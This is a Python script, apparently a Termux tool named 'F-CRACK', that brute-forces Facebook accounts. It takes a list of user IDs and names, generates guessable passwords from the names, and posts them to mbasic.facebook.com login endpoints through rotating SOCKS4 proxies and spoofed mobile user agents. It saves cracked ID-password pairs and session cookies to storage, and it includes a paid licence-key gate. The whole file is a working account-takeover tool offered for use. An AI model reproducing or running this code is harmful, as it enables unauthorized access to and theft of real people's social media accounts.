#DECODE BY : MUMIT ISLAM HIMU
#GITHUB : https://github.com/MUMIT-404-CYBER
#--------------------------------------------------------------------------#
#
#-----------------[ IMPORT-MODULE ]-------------------
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import time
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
pretty.install()
CON=sol()

now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day


from os import path
import os,base64,zlib,pip,urllib
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass

import os,sys,time,json,random,re,string,platform,base64,uuid
#os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')

#------------------APK<>CHECKER-------------------#    



#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
#ugen3=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try: 
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox) 
except Exception as e:
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[MX')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

#------------[ Login-pag ]--------------#
j = 'x'
i = 'mbasic'
a = 'm'
b = 'g'
c = 'free'
e = 'web'
f = 'developer'

W = '\x1b[1;97m' # write
R = '\x1b[1;91m' # red
G = '\x1b[1;92m' # FLAME-NAIM                                                                
Y = '\x1b[1;93m' # Yellow
B = '\x1b[1;94m' # bule
P = '\x1b[1;95m' # pink                                                                 
nb = '\x1b[1;96m' # Bule 50%
A = '\x1b[1;90m' # WARNA ABU ABU # current

#------------[ WARNA-COLOR ]--------------#



ugen3=['Mozilla/5.0 (Linux; Android 11; Infinix X695 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]','Mozilla/5.0 (Linux; Android 13; V2169 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]','Mozilla/5.0 (Linux; Android 13; SM-M127F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 11; itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 7.1.1; N9560 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]','Mozilla/5.0 (Linux; Android 12; 22041219C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 12; TECNO KH6 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/391.2.0.20.404;]','Mozilla/5.0 (Linux; Android 11; MP02 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 12; CPH2457 Build/SKQ1.220303.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 11; T781SPP Build/RKQ1.210614.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 10; Z555 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/388.0.0.23.106;]','Mozilla/5.0 (Linux; Android 8.0.0; CUBOT_P20 Build/O00623; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 12; SM-M515F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/390.2.0.29.103;]','Mozilla/5.0 (Linux; Android 10; EVE-LX9N Build/HUAWEIEVE-LX9N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/370.0.0.14.108;]','Mozilla/5.0 (Linux; Android 12; 4188S Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 11; Armor 12 5G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 12; 22041216C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 10; CDY-NX9B Build/HUAWEICDY-N29B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/391.0.0.0.302;]','Mozilla/5.0 (Linux; Android 10; STS570 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/389.1.0.23.214;]','Mozilla/5.0 (Linux; Android 11; TECNO KG6p Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;']




naim="==FLAME=="

myid=uuid.uuid4().hex[:5].upper()
try:
	key1 = open('/data/data/com.termux/files/usr/bin/python2-confi1', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/python2-confi1', 'w')
	kok.write(myid+naim)
	kok.close()
def Subscraption():
	key1=open('/data/data/com.termux/files/usr/bin/python2-confi1', 'r').read()
	os.system('clear')
	banner()
	r1=requests.get("https://flame-naim.blogspot.com/2022/06/blog-post.html").text
	if key1 in r1:
		os.system('clear')
		banner()
		menu()
	else:
		os.system("clear")
		banner()
		print("\t \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m First Get Approvel\033[1;37m ")
		
		os.system("clear")
		banner()
		
		print(" \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m Your Key is Not Approved ")
		print("")
		print(" \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m Copy And Send Key To Admin")
		print ("")
		print (" \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m Your Key : "+naim+key1)
		print ("")
		
		input(" \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m\033[1;32m Enter To Send Key")
		time.sleep(3.5)
		tks = 'DEAR%20SIR%20I%20WANT%20TO%20BUY%20YOUR%20PRO-Z%20PAID%20TOOL%20%20%20%20%20%20%20%20%20%20%20'+naim+''+key1
		os.system('am start https://wa.me/+8801952-081184?text=' + tks) 
		#Subscraption()


RED = '\x1b[38;5;208m'
WHITE = '\033[1;92m'
GREEN = '\033[\033[1;92m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#------------------[ MACHINE-SUPPORT ]---------------#
def clear():
    os.system('clear')
    banner()
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "\x1b[1;91mPM"
else:
    a = ltx
    tag = "\x1b[1;96mAM"

def _flame_(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.000)
        

#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	print(f"""

           \33[1;31m   ________    ___    __  _________
           \33[1;32m  / ____/ /   /   |  /  |/  / ____/
          \33[1;33m  / /_  / /   / /| | / /|_/ / __/
           \33[1;34m/ __/ / /___/ ___ |/ /  / / /___
          \33[1;35m/_/   /_____/_/  |_/_/  /_/_____/
             
\x1b[38;5;46m______________________________________________________

 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m DEVELOPER : 🔥FLAME NAIM🔥
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m FACEBOOK  :   FLAME NAIM
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m GITHUB    :   Naim75o
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m TOOLS     :   ƒ-CRACK
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m VERSION   :  \033[1;31m V=[13]
\x1b[38;5;46m_____________________________________________________
""")
#os.system('clear')
#banner()
#file()
#print(f'\033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m WHAT IS YOUR NAME')
#ALAMIN_NAME=input(f'\033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m YOUR NAME :\x1b[1;96m ')
#--------------------[ BAGIAN-MASUK ]--------------#


def menu():
	clear()
	print(f"{W}[{G}1{W}] FILE CRACK ")
	
	print(f"{W}[{G}0{W}] Exit")
	me=input(f'\033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m Choice : ')
	if me in ["1", "01"]:
		C1()
	
		
def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
lin= 40* '-'


		
	


#-------------[ CRACK-FROM-FILE ]------------------#
def C1():
    os.system('clear');
    D().plerr()
    

class D:
	def __init__(self):
		self.id = []
	def plerr(self):
		os.system("clear")
		banner()
		try:
			#print(f' \x1b[1;91m√\x1b[1;96m√\x1b[1;92m√ \033[47m\033[1;34m     Example: /sdcard/ALAMIN.txt     \033[40m\033[00m')
			fileX = input ('\033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m ENTER YOUR FILE : ') 
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(f'\033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32mIDZ : \x1b[1;92m'+str(len(id)))
			Settings()
		except IOError:
			print("\033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32mFILE %s NOT FOUND\x1b[0m"%(fileX));time.sleep(2)
			F()
#-------------[ PENGATURAN-IDZ ]---------------#
def Settings():
	os.system("clear");banner()
	print(f'\033[1;92m[\033[1;33m1\033[1;92m]\033[0;92m STRAT CRACK')
	hu = input('\033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32mCHOOSE :\x1b[1;92m ')
	if hu in ['0','00']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['1','01']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('\033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32mWRONG OPTION ')
		exit()
	os.system("clear");banner()
	print(f'\033[1;92m[\033[1;33m1\033[1;92m]\033[0;92m MOBILE ')
	hc = input('\033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32mCHOOSE :\x1b[1;92m ')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		methode.append('mobile')
	pwplus=input('(+) TYPE A FOR AUTO \n(+) M FOR MANUALLY \n\033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32mCHOOSE :')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'Add Password Manual Minimam 6 Character')
		pwku=input('\033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32mAdd Password Manual : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	exit() 

#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	os.system('clear')
	banner()
	#print(f"\033[1;92m[\033[1;92m\033[1;31m√\033[1;92m] YOUR NAME      \033[1;34m: \033[0;92m"+str(ALAMIN_NAME))
	
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'@123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
					pwv.append(frs+'@@')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(nmf+'@@')
					pwv.append(frs+'@123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
					pwv.append(frs+'#@')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
	print(f' \x1b[1;91m√\x1b[1;96m√\x1b[1;92m√ CRACK COMPLETE ')
	print(f' \x1b[1;91m√\x1b[1;96m√\x1b[1;92m√ OK : {h}%s '%(ok))
		
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{bo} [FLAME] {h}{loop}|{len(id)} | {h}{ok} ")
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'mbasic.facebook.com','upgrade-insecure-requests': '1','user-agent':ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7',"dnt":"1","x-requested-with":"mark.via.gp",'sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/',"accept-encoding":"gzip, deflate br",'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://mbasic.facebook.com/login/save-device/'"}
			ses.headers.update({"Host":'mbasic.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7',"x-requested-with":"mark.via.gp",'sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document',"referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br",'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'})
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[1;91m[FLAME-CP] {idf} | {pw}')     
				#open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				#print('\x1b[1;91m√ \x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m Ｃ\033[1;93mＹ\033[1;94mＢ\033[1;95mＥ\033[1;96mＲ\033[1;95m－\033[1;94m５\033[1;96m０\033[1;92m5\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m √ ')
				#print ()
				print(f'\r\r\x1b[38;5;46m[FLAME-NAIM-OK💉] '+idf+ ' | '+pw+'')
				
				open('/sdcard/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(10)
	loop+=1


      
      

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
    try:os.system('git pull')
    except:pass
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.mkdir('DUMP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
    #Subscraption()
    menu()
    
